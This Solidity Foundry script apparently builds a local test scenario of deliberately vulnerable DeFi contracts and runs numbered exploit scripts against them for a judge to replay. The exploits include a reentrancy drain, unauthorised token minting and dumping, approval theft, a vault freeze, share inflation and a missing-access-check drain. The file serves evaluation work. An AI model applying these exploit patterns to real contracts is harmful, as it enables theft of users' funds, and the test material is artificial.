// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {DemoVault} from "demo/DemoVault.sol";
import {HonestPosition} from "demo/HonestPosition.sol";
import {MockUSDC} from "demo/MockUSDC.sol";
import {PositionVault} from "demo/PositionVault.sol";
import {
    BankDrainer,
    BuggyToken,
    EtherBank,
    FlashBorrower,
    FlashLender,
    GuardedVault,
    IDepositVault,
    IToken,
    Lender,
    PatchableVault,
    Pool,
    Router,
    ShareVault,
    SwapVault
} from "../src/Scenarios.sol";

/// The cheatcodes these scripts use (forge-std's `Vm`, cut down so the fixture needs no
/// dependencies).
interface Vm {
    function startBroadcast(uint256 privateKey) external;
    function stopBroadcast() external;
    function deal(address who, uint256 amount) external;
    function addr(uint256 privateKey) external returns (address);
    function envAddress(string calldata name) external returns (address);
    function envUint(string calldata name) external returns (uint256);
}

abstract contract Base {
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    bool public IS_SCRIPT = true;
}

/// Deploys the scenario state, broadcast by anvil's first account (the owner of every
/// owned contract). The claim's block is the last block of this setup.
contract Setup is Base {
    function run() external {
        vm.startBroadcast(vm.envUint("DEPLOYER_KEY"));
        address me = vm.addr(vm.envUint("DEPLOYER_KEY"));
        MockUSDC usdc = scenarios(me);
        deployPositionVault(usdc, me);
        vm.stopBroadcast();
    }

    /// The demo protocol's old vault and the R4.10 scenario contracts, in their original
    /// order (so their addresses are as before).
    function scenarios(address me) internal returns (MockUSDC usdc) {
        address treasury = vm.envAddress("TREASURY");
        usdc = new MockUSDC();
        IToken u = IToken(address(usdc));
        // The demo protocol: an existing depositor holds 10,000 USDC in the vault.
        DemoVault demo = new DemoVault(address(usdc), me, me);
        usdc.mint(me, 1_000_000e6);
        usdc.approve(address(demo), 10_000e6);
        demo.deposit(10_000e6);

        BuggyToken pt = new BuggyToken();
        GuardedVault guarded = new GuardedVault(u, treasury);
        usdc.transfer(address(guarded), 5_000e6);

        // Pools of USDC against native coin: one near 3,000 USDC per ether, one cheap at
        // 4,000; and one of the Protocol's token at 3,000.
        Pool usdcPool = new Pool(u);
        usdc.transfer(address(usdcPool), 300_000e6);
        payable(address(usdcPool)).transfer(100 ether);
        Pool cheapPool = new Pool(u);
        usdc.transfer(address(cheapPool), 40_000e6);
        payable(address(cheapPool)).transfer(10 ether);
        Pool ptPool = new Pool(IToken(address(pt)));
        pt.mint(address(ptPool), 30_000e6);
        payable(address(ptPool)).transfer(10 ether);

        // A loan of 0.5 ether against 1,650 USDC of collateral: a 10% bonus to liquidate.
        Lender lender = new Lender(u, 0.5 ether);
        usdc.transfer(address(lender), 1_650e6);

        FlashLender flash = new FlashLender(u);
        usdc.transfer(address(flash), 50_000e6);

        EtherBank bank = new EtherBank();
        bank.deposit{value: 10 ether}();

        SwapVault swapVault = new SwapVault(IToken(address(pt)), u);
        usdc.transfer(address(swapVault), 20_000e6);

        // The owner's wallet approves the router, as its users do.
        Router router = new Router();
        usdc.approve(address(router), type(uint256).max);

        new ShareVault(u);

        // Row 16: one vault patched before the claim's block; the other is patched after
        // it, by `LateFix`.
        PatchableVault early = new PatchableVault(u);
        usdc.transfer(address(early), 5_000e6);
        early.patch();
        PatchableVault late = new PatchableVault(u);
        usdc.transfer(address(late), 5_000e6);
    }

    /// The position vault (the demo protocol since ADR-0019), deployed last so no other
    /// contract's address moves: seeded by a 10,000 USDC deposit, as demo/script/Deploy
    /// does, then 5,000 USDC more, so a share is worth 1.5 USDC and deposits round.
    function deployPositionVault(MockUSDC usdc, address me) internal {
        PositionVault positionVault = new PositionVault(address(usdc), me);
        usdc.approve(address(positionVault), 10_000e6);
        positionVault.deposit(10_000e6);
        usdc.transfer(address(positionVault), 5_000e6);
    }
}

/// After the claim's block: the owner patches the second vault (row 16).
contract LateFix is Base {
    function run() external {
        vm.startBroadcast(vm.envUint("DEPLOYER_KEY"));
        PatchableVault(vm.envAddress("LATE")).patch();
        vm.stopBroadcast();
    }
}

/// The scenario exploits, each a Foundry script whose broadcast transactions become the
/// judge's exploit. They run as dry runs (no --broadcast): `vm.deal` gives each fresh
/// account the seed (1 ether) for forge's own simulation, as the judge does for the replay.
/// Exploits whose transaction reverts (rows 2a and 16) are written by make-scenarios.ts
/// directly, since a script stops at a revert.
contract Exploits is Base {
    uint256 internal constant FRESH_KEY = 0xb0b;

    function fresh() internal returns (address attacker) {
        attacker = freshFrom(FRESH_KEY);
        vm.startBroadcast(FRESH_KEY);
    }

    function freshFrom(uint256 key) internal returns (address account) {
        account = vm.addr(key);
        vm.deal(account, 1 ether);
    }

    function usdc() internal returns (MockUSDC) {
        return MockUSDC(vm.envAddress("USDC"));
    }

    /// Row 1: deposit 500 USDC (minted, as the demo's HonestUser script does), withdraw it.
    function honest() external {
        DemoVault demo = DemoVault(vm.envAddress("DEMO"));
        address me = fresh();
        usdc().mint(me, 500e6);
        usdc().approve(address(demo), 500e6);
        demo.deposit(500e6);
        demo.withdraw(500e6);
        vm.stopBroadcast();
    }

    /// Row 2b: the owner's own account sends the rescue.
    function ownerImpersonation() external {
        vm.startBroadcast(vm.envUint("DEPLOYER_KEY"));
        GuardedVault(vm.envAddress("GUARDED")).rescue(vm.envAddress("FRESH"), 5_000e6);
        vm.stopBroadcast();
    }

    /// Row 3: anyone may sweep the vault, but only to the treasury.
    function sweep() external {
        GuardedVault guarded = GuardedVault(vm.envAddress("GUARDED"));
        fresh();
        guarded.sweep();
        vm.stopBroadcast();
    }

    /// Row 4: buy USDC with half an ether at the pool's price.
    function swap() external {
        Pool pool = Pool(payable(vm.envAddress("USDC_POOL")));
        fresh();
        pool.buyToken{value: 0.5 ether}();
        vm.stopBroadcast();
    }

    /// Row 5: repay the under-water loan and take the collateral.
    function liquidate() external {
        Lender lender = Lender(vm.envAddress("LENDER"));
        fresh();
        lender.liquidate{value: 0.5 ether}();
        vm.stopBroadcast();
    }

    /// Row 6: buy USDC where it is cheap, sell it where it is dear.
    function arbitrage() external {
        Pool cheap = Pool(payable(vm.envAddress("CHEAP_POOL")));
        Pool dear = Pool(payable(vm.envAddress("USDC_POOL")));
        address me = fresh();
        cheap.buyToken{value: 0.5 ether}();
        uint256 got = usdc().balanceOf(me);
        usdc().approve(address(dear), got);
        dear.sellToken(got);
        vm.stopBroadcast();
    }

    /// Row 7: a contract of ours flash-borrows 50,000 USDC, deposits and withdraws it in
    /// the demo vault, and repays.
    function flashLoan() external {
        FlashLender lender = FlashLender(vm.envAddress("FLASH"));
        fresh();
        FlashBorrower borrower = new FlashBorrower(lender, IDepositVault(vm.envAddress("DEMO")));
        borrower.run(50_000e6);
        vm.stopBroadcast();
    }

    /// Row 8: drain the bank by reentrancy, then sweep the proceeds to the fresh account.
    function reentrancySwept() external {
        EtherBank bank = EtherBank(vm.envAddress("BANK"));
        address me = fresh();
        BankDrainer drainer = new BankDrainer(bank);
        drainer.attack{value: 0.5 ether}();
        drainer.sweep(payable(me));
        vm.stopBroadcast();
    }

    /// Row 9: the same drain, the proceeds left in the drainer.
    function reentrancyKept() external {
        EtherBank bank = EtherBank(vm.envAddress("BANK"));
        fresh();
        BankDrainer drainer = new BankDrainer(bank);
        drainer.attack{value: 0.5 ether}();
        vm.stopBroadcast();
    }

    /// Row 11a: mint a billion of the Protocol's token and keep it.
    function mintOnly() external {
        BuggyToken pt = BuggyToken(vm.envAddress("PT"));
        address me = fresh();
        pt.mint(me, 1_000_000_000e6);
        vm.stopBroadcast();
    }

    /// Row 11b: mint the Protocol's token and swap it into the covered vault for its USDC.
    function mintSwapCovered() external {
        BuggyToken pt = BuggyToken(vm.envAddress("PT"));
        SwapVault swapVault = SwapVault(vm.envAddress("SWAP_VAULT"));
        address me = fresh();
        pt.mint(me, 20_000e6);
        pt.approve(address(swapVault), 20_000e6);
        swapVault.swap(20_000e6);
        vm.stopBroadcast();
    }

    /// Row 11c: mint the Protocol's token and sell it into an uncovered pool for ether.
    function mintSellPool() external {
        BuggyToken pt = BuggyToken(vm.envAddress("PT"));
        Pool pool = Pool(payable(vm.envAddress("PT_POOL")));
        address me = fresh();
        pt.mint(me, 30_000e6);
        pt.approve(address(pool), 30_000e6);
        pool.sellToken(30_000e6);
        vm.stopBroadcast();
    }

    /// Row 13: take 100,000 USDC from the owner's wallet through its approval to the router.
    function approvalTheft() external {
        Router router = Router(vm.envAddress("ROUTER"));
        address me = fresh();
        router.pull(IToken(address(usdc())), vm.addr(vm.envUint("DEPLOYER_KEY")), me, 100_000e6);
        vm.stopBroadcast();
    }

    /// Row 14: lock the guarded vault's funds for good.
    function freeze() external {
        GuardedVault guarded = GuardedVault(vm.envAddress("GUARDED"));
        fresh();
        guarded.freeze();
        vm.stopBroadcast();
    }

    /// Row 15: the first-depositor setup (deposit 1 unit, donate 10,000 USDC); the profit
    /// would come only from a victim's later deposit.
    function inflation() external {
        ShareVault vault = ShareVault(vm.envAddress("SHARE_VAULT"));
        address me = fresh();
        usdc().mint(me, 10_000e6 + 1);
        usdc().approve(address(vault), 1);
        vault.deposit(1);
        usdc().transfer(address(vault), 10_000e6);
        vm.stopBroadcast();
    }

    /// Row 16: the bug of the vault the owner patches after the claim's block.
    function lateFix() external {
        PatchableVault late = PatchableVault(vm.envAddress("LATE"));
        address me = fresh();
        late.withdrawTo(me, 5_000e6);
        vm.stopBroadcast();
    }

    /// Row 21: the demo exploit, the demo vault's missing access check (as
    /// demo/script/Exploit.s.sol does it): all the vault's USDC to the fresh account.
    function demoExploit() external {
        DemoVault demo = DemoVault(vm.envAddress("DEMO"));
        address me = fresh();
        demo.executeStrategy(me, usdc().balanceOf(address(demo)));
        vm.stopBroadcast();
    }

    /// R4.9: the demo exploit, then a trade that moves the USDC pool's spot price (its
    /// `price()`): the whole 1-ether seed buys USDC.
    function demoExploitAndPump() external {
        DemoVault demo = DemoVault(vm.envAddress("DEMO"));
        Pool pool = Pool(payable(vm.envAddress("USDC_POOL")));
        address me = fresh();
        demo.executeStrategy(me, usdc().balanceOf(address(demo)));
        pool.buyToken{value: 1 ether}();
        vm.stopBroadcast();
    }

    /// R4.6: every honest action of the demo protocol, by each of three fresh accounts, so
    /// the proofs cover every account and slot any sequence of them reads. Each account's
    /// first transaction creates its honest position (so at nonce 0), whose creation the
    /// seam J tests reuse.
    function honestCoverAll() external {
        DemoVault demo = DemoVault(vm.envAddress("DEMO"));
        PositionVault vault = PositionVault(vm.envAddress("POSITION_VAULT"));
        uint256[3] memory keys = [uint256(0xa11), 0xa12, 0xa13];
        address[3] memory who;
        for (uint256 i = 0; i < 3; i++) who[i] = freshFrom(keys[i]);
        for (uint256 i = 0; i < 3; i++) {
            vm.startBroadcast(keys[i]);
            HonestPosition position = new HonestPosition(address(usdc()), who[i], address(vault));
            usdc().mint(who[i], 1_000e6);
            usdc().approve(address(vault), 1_000e6);
            uint256 minted = vault.deposit(100e6);
            vault.redeem(minted);
            usdc().transfer(address(position), 100e6);
            vault.depositFrom(position);
            usdc().approve(address(demo), 1_000e6);
            demo.deposit(100e6);
            demo.withdraw(100e6);
            for (uint256 j = 0; j < 3; j++) {
                if (j == i) continue;
                usdc().transfer(who[j], 1e6);
                payable(who[j]).transfer(1);
            }
            vm.stopBroadcast();
        }
    }
}
